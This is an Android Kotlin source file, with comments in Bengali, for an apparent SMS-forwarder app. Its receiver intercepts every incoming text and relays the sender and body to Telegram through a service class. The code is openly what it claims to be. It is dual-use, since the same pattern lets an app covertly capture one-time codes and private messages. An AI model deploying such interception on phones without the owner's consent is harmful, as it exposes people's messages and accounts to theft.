package com.example.smsforwarder

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            
            // BroadcastReceiver-এর লাইফসাইকেল ছোট, তাই goAsync() ব্যবহার করা হলো
            val pendingResult = goAsync()
            
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    messages?.forEach { sms ->
                        val sender = sms.displayOriginatingAddress
                        val messageBody = sms.messageBody
                        
                        // টেলিগ্রামে পাঠানো
                        TelegramService.sendSmsToTelegram(sender, messageBody)
                    }
                } finally {
                    // কাজ শেষ হলে রিসিভার বন্ধ করা
                    pendingResult.finish()
                }
            }
        }
    }
}
